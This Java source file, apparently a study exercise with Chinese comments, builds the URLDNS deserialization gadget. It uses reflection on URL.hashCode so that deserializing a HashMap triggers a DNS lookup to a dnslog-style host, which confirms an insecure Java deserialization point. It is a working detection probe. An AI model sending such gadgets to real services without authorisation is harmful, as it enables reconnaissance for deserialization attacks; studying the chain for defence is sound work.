import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class UrlDns {
    public static void main(String[] args) throws MalformedURLException, IllegalAccessException, NoSuchFieldException {
        /**
         *
         * URL类-->hashCode()方法-->1.hashcode=!-1-->不执行DNS解析
         *                      -->2.hashcode=-1-->handler.hashCode()(hander为URLStreamHandler类对
         *                          象)-->getHostAddress(u)-->getByName(host)-->做一次DNS解析
         * HashMap类-->put(k,v)-->putVal()-->hash(k)-->k.hashCode()
         * HashMap类
         * 当HashMap的key传入为Url类型的话，k.hashCode()就会执行URL类的hashCode方法
         * hashCode对象默认为-1，也就是说传入的url会默认执行一次解析，为了验证是否存在反序列化存在，需要在反序列化之前不执行dns解析，
         * 因此需要通过反射将hashCode的v改为其他，再执行序列化与反序列化操作
         */
        HashMap<URL, Integer> hashmap = new HashMap<>();

        URL url = new URL("http://11e0086a.dns.1433.eu.org");

        Class urlClass = url.getClass();
        Field field = urlClass.getDeclaredField("hashCode");//得到URL类的hashCode字段（默认为-1）
        //getDeclaredFields：获取当前类的所有字段，包括 protected/默认/private 修饰的字段；不包括父类public 修饰的字段。

        field.setAccessible(true);
        field.set(url,3);//设置url的hashCode值为3

        hashmap.put(url,1);//

        field.set(url,-1);
        // int hashCode = url.hashCode();


        try{
            //序列化
            FileOutputStream fileOutputStream = new FileOutputStream("a.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();
            fileOutputStream.close();

            //反序列化
            FileInputStream fileInputStream = new FileInputStream("a.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();

        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        }


    }




}
